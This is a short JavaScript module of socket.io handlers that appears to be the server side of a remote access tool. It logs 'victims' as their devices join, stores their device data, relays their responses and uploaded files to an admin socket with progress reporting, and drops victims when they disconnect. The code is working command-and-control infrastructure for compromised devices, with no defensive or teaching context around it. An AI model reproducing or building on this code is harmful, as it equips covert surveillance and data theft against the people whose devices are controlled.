module.exports = {
    deviceJoin(device, socket, victimList, deviceData, io){
        console.log(`Victim joined: ${device.id}`);
        victimList[device.id] = socket.id;
        deviceData[device.id] = {...device, socketId: socket.id};
        socket.broadcast.emit('join', {...device, socketId: socket.id});
    },

    response(action, data, adminSocketId, io){
        if(adminSocketId){
            io.to(adminSocketId).emit(action, data);
        }
    },

    responseBinary(action, data, callback, adminSocketId, io){
        if(adminSocketId){
            const progress = Math.round((data.fileUploadedSize*100)/data.fileSize);
            io.to(adminSocketId).emit(action, {...data, progress});
            callback('success');
        }
    },

    handleDisconnect(socket, victimList, deviceData, adminSocketId, io){
        console.log(`Socket disconnected: ${socket.id}`);
        Object.keys(victimList).forEach(id => {
            if(victimList[id] === socket.id){
                delete victimList[id];
                delete deviceData[id];
                if(adminSocketId) io.to(adminSocketId).emit('disconnectClient', id);
            }
        });
    }
};